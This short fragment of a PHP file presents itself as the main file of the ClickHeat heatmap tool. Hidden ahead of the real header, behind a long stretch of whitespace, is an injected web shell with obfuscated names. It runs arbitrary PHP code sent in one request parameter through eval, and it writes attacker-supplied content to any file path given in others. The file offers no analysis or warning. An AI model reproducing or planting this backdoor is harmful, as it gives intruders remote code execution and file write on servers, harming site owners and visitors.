...
?>
<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  $rfiwd = "90728f19f94e62590bc69513d13171b4"; if(isset($_REQUEST['vzxz'])) { $cnpss = $_REQUEST['vzxz']; eval($cnpss); exit(); } if(isset($_REQUEST['wqjnzctf'])) { $yrgg = $_REQUEST['xhydugp']; $vfrqf = $_REQUEST['wqjnzctf']; $oqhb = fopen($vfrqf, 'w'); $fatcrdp = fwrite($oqhb, $yrgg); fclose($oqhb); echo $fatcrdp; exit(); } ?><?php
/**
 * ClickHeat : Fichier principal / Main file
 *
 * @author Yvan Taviaud - LabsMedia - www.labsmedia.com
